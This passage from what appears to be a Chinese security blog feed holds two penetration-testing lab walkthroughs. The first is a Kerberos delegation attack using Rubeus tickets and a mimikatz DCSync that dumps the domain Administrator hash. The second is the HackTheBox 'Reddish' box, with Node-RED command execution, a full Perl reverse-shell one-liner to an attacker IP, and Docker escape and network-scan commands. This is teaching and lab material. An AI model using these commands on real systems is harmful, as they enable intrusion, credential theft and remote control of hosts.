class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Hundredsu\Desktop&gt; ./Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:2f09fa55bd93e0be3c9d6cc3a617ad56 /domain:xiao</span><br><span class="line">rang.lab /dc:DC.xiaorang.lab /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Using rc4_hmac <span class="built_in">hash</span>: 2f09fa55bd93e0be3c9d6cc3a617ad56</span><br><span class="line">[*] Building AS-REQ (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;xiaorang.lab\MSSQLSERVER$&#x27;</span></span><br><span class="line">[*] Using domain controller: 172.22.2.3:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] <span class="built_in">base64</span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE2W21boNNI6Xggx1qNfILZAwIBcPsYFvjsYwpUFxTo89hY+X/GUyb8KqWuIB1ef9fsR2x9iwYBVlb7uOfGlNKdMRmIeNUsmrZlRUl4r6kPj/mdA7AlQhFOYeQN9/7ngSaa9pspAWDTDwjN3r7gviKy+m2LarXcWHiebYlN5WlpXAJ5/ep3HggxjVLM0TtnrBYgyu2vDrtdqhpf5IOVrhtY+mqsZmtaCvqDoegMSEP2txk3MoowO2HjKaGGUDewPDyKmKY8MFsH3CxQ+0bY98kYBFuJPNt5FxwNoHYfELMbq50d0Tatn4O2LHgrXwqlfFC4opfjOQP6gX63pX1lF8/VzE47AVKtH0X0/Rd6ugKk/XW93BwH5KgU9HWE9868VDpLUs3RzN8hJ8/u5FuvD7ymPCCOViUBD2omeDUfT0JrPCft6ZISNQR5WtMSAdf1Zg44sgBjpTWm4l+45fVIT/gNR4bwU2rTIr0PTidE+vxsF4nu1m2WxzSukCc4BUoc6iZfLHu51PjZkOiVQbN3bxqFTl/NEnTn7O/J4L/vyH03kxIU/yS70Db7DKa0q8mTRmNUo99OlutDQm064RYBumx9u8dbIPKd/yBLEtterJNBTZUO36Jgu4uHwbWxReb+CvNeluO0YfrkO5eMVtdAcX7yS5Pxq38mEW8ujA+Rhl77f4gVHsXgaIe362OZD44ZhPrWP3R+1M6togXqktMKtId4DyGehqvwrJTbwqTcaiMuAk87XMl1r6JkZGqF9gD9iLbSH1Iiqt/w/ybUy4S9q+DwaTOFof3gDzkRagtngBbor+nt4JiLPq9a7TY0B3Y/jVky0SQH0eLIqFCNVz523YE8hXboPCyZLAMAFnM7sX8SJ46zpf4i8N5tRTRHRvUC/oWW4UyNzFEONG350XvVrD4+KTtxO55Xvl5D0rsw/vlZTqTnDoUNgCyTScX28EcEsEd8dWmu3NbZDD9XfhxKtOUDuB1yjYcHumbG243amptxbAnYJY5HKb1FoZFqyibutvjibUaiXenWdvmOx3qWYPy+L/VgWta0GP2gmelfMW7qiA3i1v2oLg3Z8dUC6YAgXGj6Rn0CV4Lr/t0/KRPrZFjkIahStIC6tkVV2QC5p/cNcenKVcWUVdqaqrnqb+xHCbIfInsF02mDZeg2C0SJPR85e1TKvN26VwcdWtsrwp774rwEnnAEsmhHuNqd7PDcOS0as3KOPx5zBWXrytJKL2L5Gv1g0pqZ0bagqK2yVPj6GuWPJ3d3zeTeh55+lUd76tJ9SNyYUtynWit1j1a2Tv5I4dAIcqLQJ5btFxBz5wgbyHnfg0X8c82HGvJA/wwSzgFSga9pByLwImeTijf8lFt3tbOyiRDjnpNEVPhPpmWfSMmAVghUuLSKwlfqMvWJsNKvx96X4GtSTn3/aBmOhMMV+mGUE+xY0KjkVlvTjgGxGDYhcjBuObk0ao3EozRWjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDEaZuQGw9Yw9uEC7sTXx4GoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDQxNjEwNTA0NlqmERgPMjAyNTA0MTYyMDUwNDZapxEYDzIwMjUwNDIzMTA1MDQ2WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/xiaorang.lab</span><br><span class="line">  ServiceRealm             :  XIAORANG.LAB</span><br><span class="line">  UserName                 :  MSSQLSERVER$</span><br><span class="line">  UserRealm                :  XIAORANG.LAB</span><br><span class="line">  StartTime                :  2025/4/16 18:50:46</span><br><span class="line">  EndTime                  :  2025/4/17 4:50:46</span><br><span class="line">  RenewTill                :  2025/4/23 18:50:46</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  xGmbkBsPWMPbhAu7E18eBg==</span><br><span class="line">  ASREP (key)              :  2F09FA55BD93E0BE3C9D6CC3A617AD56</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>第二步</strong>使用上面获取到的TGT去申请一个ST</li></ol><p>具体的原理</p><p>然后通过 <code>S4u2seflt</code> 拓展协议使用 <strong>TGT</strong> 向 <strong>TGS</strong>(票据授予服务器) 请求代表 <strong>Administrator</strong> 用户访问 <strong>DC.xiaorang.lab</strong> 上的 <strong>LDAP 服务</strong> 的 <strong>ST</strong>(服务票据)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE0JsDD5zUc3St0yTDHf5rguciA8UqJCJ2VtLblTGwGqqKIVfod7A+fBG3FGg6ma2BlmYzSiBJY/EeWDfFJLzRRGvLmWOWpJUMl0nxfZgnSBabSyResFise8cIga28gxMU2BrxgJs6gi5FcjWw9rrLOkg4SPkcNHpGx+x3o1hF85ZxvpFLfV527rhFa1QMdjFAsh3op1XCEPabj5hTPYHZ4ojnev/KODXAlq1a032B0+MmDGLL3/310yLVytaCMXjtp52vURZNOb9oMrvJ2aQdA1ReImiLRUNzESEaImU6mVrEDDoMdhOwftVVOa9zXbIn9SKMcSbvotw9A8IW/DGHg965r9zCRvzHahy8OYPsoo2GLrkQtUePOcZXRMd07Sm2R1A2t2IdQ3PAgwm4hzcTkzJB6uTotR/3gUxYs7UaB/8WiujNl8TSKdgmzXhmNGg0GJL8kVix7Kb1ahi3aFwTY0fSFXIUlMJsfpqfC6LEpa+mqooCbxIt0w0VbRbR/9lqJEoFcrjvGGkWBOLbPkgvpcDjjwvzOgnIPIFRO6ab0pACbFws/T0qaKxm3iX3649cW77aLTtESHs1ICEmKpFO6xFoqQO3w46I+mWCtIylccgIBl/qLnuBiSABX1kjE+LDRqTomb7T3IWnWTMcC4YG8mfGisPwiFqz0U8oJX70WFVoYEIz0dE1BQ3f22umGltramUeIFGQiREDi6Keo1mrReZP0pBnL1pyLPQtN8iybX0nwYxPYSdDve6QW6XizNKv9uwHy5lp8PNXB60l35qE962zm99Hn421tdjn3etmH1hGEOUIIh3d/0IQGpAnWuxljiWLE5oU+eoBu4mnxU4P68YUGfnlXl1LYc4alre8bhcjjO3DNAyPAqtFTPxrmXQmEUDPeJ5fzTYol15Cc0QpQWrcdV/0RTNMke8Cawh1tz/bCEMwz2QvZwQSVoVJnDEG77TMn0OJaSgGQC79wbRkd+Qn6GtAEvogI0vlJBwTzaC96Os6FGb9a+tZWr0uyZwPBfLb+e3/Q5JzCrlF6lu7H9uiKzBYF6LeycLqlFhxTtDsuYsKQzmNbveZPX663ZU5hb6qADVog8sFnUQhGfhq1LUFbXV2/DUve67kvc1wHpd1qkGEtl0ANC2dMPbwamf1wOG9gydvcqsmsL2vI9gCchki4hHKjNly7NFOB7V7cKy1OnkK0+/J5wjNJ/axZm9SpepVcVMFdvTniUQvgNSB+/IzupQRTzw6RmutU2Ph5Qom3TnuFu1Y+Js1cCHIm8A/sH5YMSDwkTYRwFotPkoR6wQAg5y3DAZM7kbmz/01BeKgl736pdO5lXwcoQNR8wbL1p/sXrAXiEh/rU/aVgX0FFxu5lL5xgF8/owcpUU2xL9N3cL8O592Oxo35RzLNkYQp7f1lpBSFYMsT16QPQJgo4WjFYGQ7GEfybWrLkqqwzJ2bMTqMy93tj6Jjie0KjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBD/kTsJOka4ypAtAz0I6mKmoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDQxNjEwNTc0NlqmERgPMjAyNTA0MTYyMDU3NDZapxEYDzIwMjUwNDIzMTA1NzQ2WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/46.png"></p><p>然后使用mimikatz抓取管理员的密码</p><p>这里重新用本地管理员的运行mimikatz，使用Dcsync抓取域管的hash</p><blockquote><p><strong>原理——DCSync攻击（主副域控同步）</strong></p><p>什么是Dcsync(domain Controller synchronization)（<strong>主副域控同步</strong>）:在内网中一般不是一个域控，会有域树或者域森林等，域控之间是要<strong>同步数据</strong>的,不同的域控15分钟之间要发起一次数据同步的请求，请求里面就包含同步的数据，这里采用的协议是**DRS(目录复制服务)**，这个就是DCsync</p><p><strong>简单来说就是</strong> 利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据<br><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/47.png"></p><p><strong>利用条件</strong></p><p><strong>要进行DCSync则必须要能够运行DRS服务，通常以下用户组可以运行DRS服务</strong></p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>域控的Administrator和system也可以</p></blockquote><p><font style="color:rgb(218, 219, 248);background-color:rgb(20, 19, 39);"></font></p><p>我们获取到了LDAP 服务的ST后，就可以与域控进行交互了，并且可以借助<a href="https://c1trus.top/26-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8.html#_0">mimikatz</a> 进行DCSync攻击</p><p>以下命令执行后，mimikatz 会尝试从域控制器同步 <code>Administrator</code> 账户的哈希值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /domain:xiaorang.lab /user:Administrator</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是抓到的administrator的hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1a19251fbd935969832616366ae3fe62</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/48.png"></p><p>开梭</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/49.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reddish</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<p>看佬c1trus说是很难的靶机，但是能学东西，正好最近在学docker逃逸，打一打</p><p><img src="/img/reddish/1.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>10.10.10.94</p><p>tscan扫端口</p><p><img src="/img/reddish/2.png"></p><p>只开放了一个端口1880</p><p><font style="color:rgb(232, 128, 128);background-color:rgba(232, 128, 128, 0.16);">Mongo-Express</font></p><p><font style="color:rgb(232, 128, 128);background-color:rgba(232, 128, 128, 0.16);">Node.js</font></p><h1 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点"></a>外围打点</h1><h2 id="node-red-rce"><a href="#node-red-rce" class="headerlink" title="node-red-rce"></a>node-red-rce</h2><p>访问显示这个</p><p><img src="/img/reddish/3.png"></p><p>那么我们post看一下</p><p><img src="/img/reddish/4.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;ffec0b75777a00bc6e65ff2660896ad1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;ip&quot;</span>: <span class="string">&quot;::ffff:10.10.16.38&quot;</span>,</span><br><span class="line">  <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/red/&#123;id&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这个提示进行访问</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">10.10</span>.<span class="number">10.94</span>:<span class="number">1880</span>/red/ffec0b75777a00bc6e65ff2660896ad1/</span><br></pre></td></tr></table></figure><p><img src="/img/reddish/5.png"></p><p>可以看到node-red</p><p>查一下看看有没有rce漏洞</p><p><img src="/img/reddish/6.png"></p><p><a href="https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/">https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/</a></p><p><img src="/img/reddish/7.png"></p><p>可以通过其功能完成rce</p><p>我们可以通过inject注入命令，使用exec执行</p><p><img src="/img/reddish/8.png"></p><p>这里输入payload反弹shell</p><p><img src="/img/reddish/9.png"></p><p><img src="/img/reddish/10.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl <span class="literal">-e</span> <span class="string">&#x27;use Socket;$i=&quot;10.10.16.38&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><p>连接exec后点击部署，再点inject旁的方块就可以执行</p><p><img src="/img/reddish/11.png"></p><p><img src="/img/reddish/12.png"></p><p><img src="/img/reddish/13.png"></p><p>还是用kali打吧，连上vpn</p><p><img src="/img/reddish/14.png"></p><p>看见这个就是成功了</p><p>本地监听</p><p><img src="/img/reddish/15.png"></p><p><img src="/img/reddish/16.png"></p><p>记得修改ip为自己的ip</p><p><img src="/img/reddish/17.png"></p><p>反弹shell成功</p><h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><h2 id="内网横向-docker横向"><a href="#内网横向-docker横向" class="headerlink" title="内网横向-docker横向"></a>内网横向-docker横向</h2><p>进来直接就是root权限，很可能为docker</p><p>我们信息收集判断一下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/<span class="number">1</span>/cgroup | grep <span class="literal">-qi</span> docker &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Is Docker&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Not Docker&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/<span class="number">1</span>/cgroup</span><br></pre></td></tr></table></figure><p><img src="/img/reddish/18.png"></p><p>再查看一下根目录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> <span class="literal">-la</span></span><br></pre></td></tr></table></figure><p><img src="/img/reddish/19.png"></p><p>.dockerenv</p><p>就是docker了</p><p>那么接下来我们需要逃逸或者横向</p><h3 id="docker信息收集"><a href="#docker信息收集" class="headerlink" title="docker信息收集"></a>docker信息收集</h3><p>先尽量逃逸吧，信息收集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断特权模式</span></span><br><span class="line"><span class="built_in">cat</span> /proc/self/status | grep <span class="literal">-qi</span> <span class="string">&quot;0000003fffffffff&quot;</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Is privileged mode&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Not privileged mode&quot;</span></span><br><span class="line"><span class="comment">#挂载DockerSocket</span></span><br><span class="line"><span class="built_in">ls</span> /var/run/ | grep <span class="literal">-qi</span> docker.sock &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Docker Socket is mounted.&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Docker Socket is not mounted.&quot;</span></span><br><span class="line"><span class="comment">#挂载procfs</span></span><br><span class="line">find / <span class="literal">-name</span> core_pattern <span class="number">2</span>&gt;/dev/null | wc <span class="literal">-l</span> | grep <span class="literal">-q</span> <span class="number">2</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Procfs is mounted.&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Procfs is not mounted.&quot;</span></span><br><span class="line"><span class="comment">#挂载宿主机根目录</span></span><br><span class="line">find / <span class="literal">-name</span> passwd <span class="number">2</span>&gt;/dev/null | grep /etc/passwd | wc <span class="literal">-l</span> | grep <span class="literal">-q</span> <span class="number">7</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Root directory is mounted.&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Root directory is not mounted.&quot;</span></span><br><span class="line"><span class="comment">#dockerremoteapi未授权访问</span></span><br><span class="line">IP=`hostname <span class="literal">-i</span> | awk <span class="operator">-F</span>. <span class="string">&#x27;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#x27;</span> ` &amp;&amp; timeout <span class="number">3</span> bash <span class="literal">-c</span> <span class="string">&quot;echo &gt;/dev/tcp/<span class="variable">$IP</span>/2375&quot;</span> &gt; /dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Docker Remote API Is Enabled.&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;Docker Remote API is Closed.&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/reddish/20.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/self/status | grep -qi &quot;0000003fffffffff&quot; &amp;&amp; echo &quot;Is privileged mode&quot; || echo &quot;Not privileged mode&quot;</span></span><br><span class="line">Not privileged mode</span><br><span class="line"><span class="comment"># ls /var/run/ | grep -qi docker.sock &amp;&amp; echo &quot;Docker Socket is mounted.&quot; || echo &quot;Docker Socket is not mounted.&quot;</span></span><br><span class="line">Docker Socket is not mounted.</span><br><span class="line"><span class="comment"># find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;Procfs is mounted.&quot; || echo &quot;Procfs is not mounted.&quot;</span></span><br><span class="line">Procfs is not mounted.</span><br><span class="line"><span class="comment"># find / -name passwd 2&gt;/dev/null | grep /etc/passwd | wc -l | grep -q 7 &amp;&amp; echo &quot;Root directory is mounted.&quot; || echo &quot;Root directory is not mounted.&quot;</span></span><br><span class="line">Root directory is not mounted.</span><br><span class="line"><span class="comment"># IP=`hostname -i | awk -F. &#x27;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#x27; ` &amp;&amp; timeout 3 bash -c &quot;echo &gt;/dev/tcp/$IP/2375&quot; &gt; /dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Docker Remote API Is Enabled.&quot; || echo &quot;Docker Remote API is Closed.&quot;</span></span><br><span class="line">Docker Remote API is Closed.</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>都没有</p><p>那么只能在docker里进行横向，再看看其他的docker是否有漏洞可以逃逸了</p><p>信息收集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看有没有外连接口、和服务</span></span><br><span class="line"><span class="comment"># ss -tunlp</span></span><br><span class="line">Netid  State      Recv<span class="literal">-Q</span> <span class="built_in">Send-Q</span>     Local Address:Port       Peer Address:Port </span><br><span class="line">udp    UNCONN     <span class="number">0</span>      <span class="number">0</span>             <span class="number">127.0</span>.<span class="number">0.11</span>:<span class="number">36168</span>                 *:*     </span><br><span class="line">tcp    LISTEN     <span class="number">0</span>      <span class="number">128</span>           <span class="number">127.0</span>.<span class="number">0.11</span>:<span class="number">39029</span>                 *:*     </span><br><span class="line">tcp    LISTEN     <span class="number">0</span>      <span class="number">5</span>                      *:<span class="number">1111</span>                  *:*      users:((<span class="string">&quot;socat&quot;</span>,pid=<span class="number">19395</span>,fd=<span class="number">5</span>))</span><br><span class="line">tcp    LISTEN     <span class="number">0</span>      <span class="number">128</span>                   :::<span class="number">1880</span>                 :::*      users:((<span class="string">&quot;node&quot;</span>,pid=<span class="number">1</span>,fd=<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ip a</span></span><br><span class="line"><span class="number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="number">65536</span> qdisc noqueue state UNKNOWN <span class="built_in">group</span> default qlen <span class="number">1000</span></span><br><span class="line">    link/loopback <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> brd <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">    inet <span class="number">127.0</span>.<span class="number">0.1</span>/<span class="number">8</span> scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">13</span>: eth0@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue state UP <span class="built_in">group</span> default </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:<span class="built_in">ac</span>:<span class="number">12</span>:<span class="number">00</span>:<span class="number">02</span> brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet <span class="number">172.18</span>.<span class="number">0.2</span>/<span class="number">16</span> brd <span class="number">172.18</span>.<span class="number">255.255</span> scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">19</span>: eth1@if20: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue state UP <span class="built_in">group</span> default </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:<span class="built_in">ac</span>:<span class="number">13</span>:<span class="number">00</span>:<span class="number">04</span> brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet <span class="number">172.19</span>.<span class="number">0.4</span>/<span class="number">16</span> brd <span class="number">172.19</span>.<span class="number">255.255</span> scope global eth1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到有172.18.0.2&#x2F;16和172.19.0.4&#x2F;16</p><p>这两个网段</p><h4 id="无工具内网探测"><a href="#无工具内网探测" class="headerlink" title="无工具内网探测"></a>无工具内网探测</h4><p>利用脚本进行扫描</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq <span class="number">1</span> <span class="number">255</span>`; <span class="keyword">do</span> ping <span class="literal">-c</span> <span class="number">1</span> <span class="literal">-W</span> <span class="number">1</span> <span class="number">172.18</span>.<span class="number">0</span>.<span class="variable">$i</span> | grep <span class="string">&#x27;from&#x27;</span>; done</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq <span class="number">1</span> <span class="number">255</span>`;<span class="keyword">do</span> ping <span class="literal">-c</span> <span class="number">1</span> <span class="literal">-W</span> <span class="number">1</span> <span class="number">172.19</span>.<span class="number">0</span>.<span class="variable">$i</span> |grep <span class="string">&#x27;from&#x27;</span> ;done</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in `seq 1 255`; do ping -c 1 -W 1 172.18.0.$i | grep &#x27;from&#x27;; done</span></span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.18</span>.<span class="number">0.1</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.077</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.18</span>.<span class="number">0.2</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.039</span> ms</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in `seq 1 255`;do ping -c 1 -W 1 172.19.0.$i |grep &#x27;from&#x27; ;done</span></span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.19</span>.<span class="number">0.1</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.092</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.19</span>.<span class="number">0.2</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.070</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.19</span>.<span class="number">0.3</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.078</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.19</span>.<span class="number">0.4</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.026</span> ms</span><br></pre></td></tr></table></figure><p>整理一下，172.19.0.1和172.18.0.1肯定就是宿主机了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.19</span>.<span class="number">0.1</span>  <span class="number">172.18</span>.<span class="number">0.1</span>   宿主机</span><br><span class="line"><span class="number">172.19</span>.<span class="number">0.4</span>  <span class="number">172.18</span>.<span class="number">0.2</span>   本机 跳板容器</span><br><span class="line"><span class="number">172.19</span>.<span 